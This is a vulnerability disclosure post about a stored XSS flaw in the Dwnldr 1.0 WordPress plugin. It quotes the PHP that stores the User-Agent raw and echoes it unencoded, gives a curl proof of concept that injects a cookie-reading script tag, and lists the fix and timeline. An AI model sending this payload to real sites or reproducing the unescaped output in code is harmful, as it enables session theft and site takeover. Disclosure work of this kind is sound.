---
layout: single
title: Dwnldr 1.0 Stored XSS Disclosure
date: 2016-07-18
categories:
  - security
  - websec
  - disclosure
tags:
  - wordpress
  - dwnldr
  - stored xss
excerpt: Due to a lack of input sanitization in the `dwnldr.php` file, it is possible for unauthenticated users to utilise an XSS vector to store and run a script in the target user's browser and potentially compromise the WordPress installation.
---
## Homepage
[https://wordpress.org/plugins/dwnldr/](https://wordpress.org/plugins/dwnldr/)

## Overview
Due to a lack of input sanitization in the `dwnldr.php` file, it is possible for unauthenticated users to utilise an XSS vector to store and run a script in the target user's browser and potentially compromise the WordPress installation.

The vulnerable code can be found on lines 92 and 66 of `dwnldr.php`.

On line 92, when logging the download request, the content of `HTTP_USER_AGENT` is stored in the database in its raw form:

```php
$log = array(
    'user' => get_current_user_id(),
    'time' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'browser_info' => $_SERVER['HTTP_USER_AGENT'],
);
$meta = apply_filters('dwnldr_logs', $log);
add_post_meta($post->ID, '_download_log', $meta);
$this->force_download( $post, $ext );
```

When an admin user views the download logs, on line 66, it will echo the user agent string to the user with no encoding:

```php
<td><span title="<?php echo $log['browser_info']; ?>"><?php echo substr($log['browser_info'], 0, 64).'&hellip;'; ?></span></td>
```

## CVSS Score
5.3

## CVSS Vector
[(AV:N/AC:L/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C)](https://nvd.nist.gov/cvss.cfm?calculator&version=2&vector=(AV:N/AC:L/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C))

## Versions Affected
1.0

## Solution
Upgrade to version 1.01

## Proof of Concept
```bash
curl -A "User-Agent: <script>alert(document.cookie);</script>" -O http://<target>/?attachment_id=<attachment id>
```

## WordPress Exploit Framework Module
[exploit/xss/stored/dwnldr\_xss\_shell\_upload](https://github.com/rastating/wordpress-exploit-framework/blob/development/modules/exploit/xss/stored/dwnldr_xss_shell_upload.rb)

## WPVDB-ID
8556

## Disclosure Timeline
* **2016-07-17**: Identified vulnerability, contacted vendor with POC and a solution.
* **2016-07-18**: Vendor responded and released patch.
* **2016-07-18**: Disclosure made public
